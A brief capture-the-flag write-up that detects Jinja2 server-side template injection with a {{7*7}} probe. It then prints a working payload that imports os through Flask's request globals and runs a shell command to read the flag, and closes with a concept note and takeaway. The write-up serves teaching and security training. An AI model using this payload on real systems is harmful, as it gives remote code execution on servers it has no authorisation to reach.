# SSTI1

**Category:** Web Exploitation

## Solution

The application reflected user input, so I tested:

```text
{{7*7}}
```

The response returned `49`, confirming **Jinja2 SSTI**.

I then used the following payload to execute a command and read the flag:

```text
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

This accesses Python's built-ins through the Flask request object, imports `os`, executes `cat flag`, and returns the output.

## Concept

**SSTI (Server-Side Template Injection):** User input is interpreted as server-side template code instead of plain text. In vulnerable Jinja2 applications, this can escalate to **Remote Code Execution (RCE)**.

**Key Takeaway:** Test reflected inputs with template expressions such as `{{7*7}}` to identify SSTI.

**Tools:** Browser, Burp Suite
